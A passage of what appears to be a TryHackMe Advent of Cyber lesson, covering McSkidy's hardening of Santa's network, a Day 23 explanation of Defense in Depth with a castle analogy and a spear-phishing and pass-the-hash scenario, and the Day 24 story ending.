Santa's website was defaced earlier. When investigating that attack, McSkidy found that an SSH port was open on the server hosting the website. This led to the attacker using that open port to gain entry. McSkidy closed this port.  

Put up the shields:  
Although the open SSH port was protected by a password, the password was not strong enough to resist a brute-forcing attempt. McSkidy implemented a stronger password policy to make brute-forcing difficult. Moreover, a timeout would lock a user out after five incorrect password attempts, making brute-force attacks more expensive and less feasible.

Control the flow of information:  
McSkidy was informed by her team about the GitHub repository that contained sensitive information, including some credentials. This information could be an attack vector to target Santa's infrastructure. This information was made private to block this attack vector. Moreover, best practices were established to ensure credentials and other sensitive information are not committed to GitHub repositories.

Beware of deception:  
Another attack vector used to intrude into Santa's network was phishing emails. McSkidy identified that no phishing protection was enabled, which led to all such emails landing in the inbox of Santa's employees. McSkidy enabled phishing protection on Santa's email server to filter out spoofed and phishing emails. All emails identified as phishing or spoofed were dropped and didn't reach the inbox of Santa's employees.

Prepare for countering human error:  
The phishing email that targeted Santa's employees contained a document containing malicious macros. To mitigate the risk of malicious macro-based documents compromising Santa's infrastructure, McSkidy disabled macros on end-user machines used by Santa's employees to avoid malicious macro-based attacks.

Strengthen every soldier:  
McSkidy wanted the attack surface reduced from every endpoint's point of view. So far, she had taken steps to strengthen the network as a whole. For strengthening each endpoint, she took help from [Microsoft's Attack Surface Reduction rules](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide). Though these rules were built into the Microsoft Defender for Endpoint product, she took help from these rules and created a similar set of rules for her own EDR platform. 

Make the defense invulnerable:  
To further strengthen the infrastructure, McSkidy carried out a vulnerability scan highlighting some vulnerabilities in the internet-facing infrastructure. McSkidy patched these vulnerabilities found on Santa's internet-facing infrastructure to avoid exploitation.

After implementing these steps, McSkidy was a little relieved. However, she understood that though her attack surface was reduced, she still needed to be vigilant to avoid any incidents. Come back tomorrow to see what other steps McSkidy takes to strengthen her defenses. See ya!

### [Day 23] Defence in Depth Mission ELFPossible: Abominable for a Day

                  The Story

![Banner for Day 23](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/4efae3f1894e77bb72afcd58791b2961.png)

Check out Marc's video walkthrough for Day 23 [here](https://youtu.be/eib8zGMTook)!  

Every effort you have put through builds on top of each other to bring you right at this moment. Santa and the security team are so proud of you for sticking around and being with us until now. You’re practically a member of the SSOC team already! There’s just one more thing left to learn: a lesson that may completely change how you look at and approach security.

Throughout all the previous tasks, layering defenses and reducing attack surfaces have been touched upon at least once. Writing secure code and being able to respond and analyse different parts of the attack chain, among others, are all essential in maintaining Santa's Security Posture defensible. In this task, we will focus on what is formally known in security circles as Defense in Depth, which is a more general and encompassing topic than the prior ones on their own.

Core Mindset

The core mindset that Defense in Depth is founded on is the idea that there is no such thing as a silver bullet that would defeat all of an organisation’s security woes. No single defence mechanism can protect you from the bad world out there.

Contrasting the Past and the Modern Takes on Defensive Security

Castle walls are built to withstand sieges and barrages and are fortified and manned well to protect from pillagers and marauders. Yet despite all this effort and diligence at maintaining and protecting this security measure, attackers will breach it sooner or later, and depending on the defenders' response within the castle walls, may mark the start of their end.

![Security Elf](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/fb56361ab25a143e789048eb19f62860.png)For the longest time, and maybe even until today, a lot of organisations have looked at their security posture in the same way medieval lords did: a strong focus on securing the castle walls - the perimeter, so to speak. However, like medieval lords, after the perimeter is breached and depending on the organisation’s response, it’s pretty much done for them too.

Fret not, though! Modern defensive security teams are moving on from this mindset and are shifting to a more robust approach. Being mindful that the castle wall, while important, is not the only way to secure the organisation, acknowledging the reality that at some point, gunpowder will be discovered and a single point of failure consequently exploited, and having additional defensive layers, especially for the specific _crown jewels_ that the bad guys may be targeting - these are some of the foundations that make up the modern security posture of defensible organisations.

Disrupting Adversarial Objectives

Defense in Depth is mainly focused on disrupting adversarial objectives; that is, the shift of focus from ‘just’ securing the perimeter to securing everything in the path that the adversary will have to take from the perimeter to the crown jewels.

Let’s look at it at three varying levels of defense:

1.  The first level is having a focus on perimeter security. There are great prevention mechanisms present in the perimeter and essentially complete trust within it; thus, once the perimeter is bypassed, the organisation is pretty much at the mercy of the adversary.
2.  The second level has defensive layers in place; however, the emphasis is solely on prevention. It doesn’t leverage ‘knowing your environment’; even though adversarial objectives may be prevented to some degree, there’s a missed opportunity in terms of detection and consequently, alerting and response. Prevention is good, but the key to defeating the bad guys is having visibility into what they are doing.
3.  The third level has well-rounded defensive layers in place, leveraging the strategic application of sensors, effective creation of analytics, and efficient alerting and response capabilities of the security team. Preventative measures here are not only coupled by detection and alerting but also by immediate and efficient response.

The first level above can be thought of as an organisation that employs great perimeter defenses in place, such as Web Application Firewalls (WAFs), Perimeter Network Firewalls, and even a Demilitarized Zone (DMZ), but is yet to implement internal network security, and zero trust mechanisms are not yet in place.

The second level can be thought of as an organisation that employs the first level of defenses but with more capable internal security measures, such as network segmentation, zero trust principle implementation, least privileged access principle implementation, and even hardened hosts and networks. Having this level is actually really good; however, forgetting that preventative appliances may be used for detective capabilities, too, is a wasted opportunity.

The third level can be thought of as using the advantages of the first and second levels to ramp up the detection and response capability of the organisation via effective log collection and well-crafted analytics. This is where it goes full circle. We are not only expected to be good at layering preventive measures against attacks, but we should also be capable of responding to them if and when these defensive capabilities are bypassed.

![Bandit Yeti: Abominable for a Day](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/9c4b9cf210bca525421b44a0ac19cd7a.png)

Let’s have the following scenario as an example: let’s say an adversary was able to penetrate our perimeter defenses via a successful spear phishing campaign. He would need to navigate a hardened environment full of tripwires and traps.

He may be able to take over a specific user’s account, but since we have implemented the principle of least privilege access properly, he would be limited in terms of what he can work with. He may be able to move laterally to another user with better privileges via pass-the-hash. Still, since we have good logging mechanisms and detection capabilities, our analytics would know exactly what pass-the-hash looks like, so we will pick this activity up. Our cavalry will be alerted to respond and remediate this particular breach immediately.

Remember that the main difference between levels 2 and 3 is the jiving together of these defensive layers and detection and response mechanisms, allowing for a coherent and well-rounded security posture.

A goal of layering defenses is to limit the room for mistakes that an adversary can have. In that sense, the bad guys need to get everything correct, but we only need them to make a mistake once.

To drive this point home, we will explore what it’s like to be in the bad guy’s shoes.

We have prepared a little game for you. The game's objective is simple: get your hands on the Naughty or Nice list in Santa’s vault. There will be three levels; each consequent one builds a defensive layer on top of the previous one and will be a little bit harder. Remember that you’re playing as the Bad Yeti here, so make sure you don’t get caught!

Game summary / post-game discussion

After completing the game and experiencing the different levels of difficulty that an adversary may face when layering defensive measures, it must be clear to you by now that layering defenses is cool!

The levels of the game are an analogy to the three varying levels of defenses discussed earlier in this task. Further, the attack chain within the game can be interpreted as follows: Santa’s Executive Assistant (EA) receives a spear phishing email. Upon establishing a foothold, the Bad Yeti immediately realises that the EA doesn’t have access to the Naughty or Nice list. So after some enumeration and even assuming Santa’s identity at one point, the Bad Yeti was able to get ahold of the coveted list and actually ruin Christmas. Good thing it was just a game!

While the reason behind it is to show the varying effects of having defensive layers from the bad guy's perspective, on the flip side, the reality of implementing it for defensive security teams is more iterative and cyclic. Breaches and true-positive detections show areas that require improvement and the extent of our visibility in the organisation, respectively. Attacks, whether or not successful, should further inform defensive steps and approaches. If we learned that an adversary was able to exploit a specific vulnerability, then rest assured that the vulnerability will be patched and the application introducing it will be hardened.

Summary and Conclusion

Modern security practices are composed of layers. Stopping attacks from the get-go is very helpful - ideal even, but it’s not always possible. Everyone can and will be compromised - it’s just a matter of when, and it’s up to every one of us to disrupt them from being able to do what they intend to do and in every step of the way.

###  [Day 24] The EndThe Year of the Bandit Yeti

[Nightmare Before Elfmas - The End]

Ah, what a month! As McSkidy watched Santa’s sleigh take off, loaded with gifts, she sighed with relief.  
We did it!   

![McSkidy walks through Santa's workshop while other elves go about their pending tasks](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/986c561fe48ff1bcd73f0fd2e4a24b8b.png)  

Looking around the workshop, she could see Santa’s SOC Team working on their tasks.  
Some were setting up additional defenses, some were implementing new security policies,  
and some were trying out new skills (and hats!) too.

![The Bandit Yeti walks away from Santa's compund](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/03eb8181e1c70490027eba487ed0a092.png)

There are some things McSkidy can’t see, but would be vital for you to know.   

![The Bandit Yeti tears down the board with his 2022 evil plan](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/248aec616890f5b7727a41d70e08fc32.png)  

The Bandit Yeti has left the area and returned to his lair, defeated for now.  

![The Yeti crosses out 2022 and writes 2023 to start off planning for next year](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/a8064e6db7bb810884ac871b79cab65d.png)  

If we could look inside his planning room, we’d see the beginnings  
of a new scheme, but let’s not worry about that today!

![McSkidy enters the SOC room](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/90602a5c3976a61dbfa12ec75b0157ea.png)

As McSkidy returned to her office, she looked at her desk,  
where just 24 days ago, an evil-looking card was placed.   
Now that spot was occupied by a scroll with a massive security to-do list. 

![McSkidy unrolls the scroll with the security to-do list](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/ec1548addd9ede507fcfbf486353a602.png)

They all worked hard to clear as many items as possible, but many remain.  
Security is never done!  

![McSkidy crosses out the Save Christmas item off the list](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/aeb03cb85124ffcc48ba73c9ba8334f6.png)

However, with Santa in the air, she could cross out “Save Christmas” off the list. Success!  

![McSkidy and the whole Elf team celebrate victory with a nice Christmas meal](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/99ebd7040adfbed402e526a9e2f15a68.png)

McSkidy and all the Elves from Santa’s Security Team thank you for your help this year.  
They promised to call you if they get into trouble in 2023!
